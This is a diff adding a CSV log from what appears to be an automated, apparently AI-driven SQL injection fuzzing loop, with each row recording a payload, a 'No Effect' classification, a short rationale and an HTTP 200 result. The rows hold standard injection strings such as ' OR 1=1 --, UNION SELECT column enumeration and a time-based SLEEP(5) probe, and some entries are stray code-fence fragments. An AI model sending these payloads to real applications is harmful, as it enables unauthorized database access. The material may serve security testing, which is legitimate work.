@@ -1,0 +1,8 @@
+iteration,initial_payload,classification,reasoning,discriminator_improved_payload,generator_final_payload,test_result
+1,```vbnet,No Effect,The payload does not appear to be an SQL injection attempt.,' OR 1=1 --,,200
+1,' OR 1=1 --,No Effect,The payload does not seem to affect the application's behavior.,' OR 1=1 UNION SELECT GROUP_CONCAT(column_name) FROM table_name --,,200
+1,```,No Effect,The provided payload does not cause an SQL injection error.,"' UNION SELECT 1,2,3,4,5 --",,200
+2,' OR 1=1 --,No Effect,The payload does not seem to affect the application's behavior.,' OR 1=1 UNION SELECT GROUP_CONCAT(column_name) FROM table_name --,,200
+3,' OR 1=1 --,No Effect,"The payload does not affect the SQL query, it only adds a comment which is ignored by the database.",' OR SLEEP(5) --,,200
+4,' OR 1=1 --,No Effect,The payload does not seem to affect the application's behavior.,' OR SLEEP(5) --,,200
+5,' OR 1=1 --,No Effect,The payload does not seem to affect the application's behavior.,' OR 1=1 UNION SELECT GROUP_CONCAT(column_name) FROM table_name --,,200
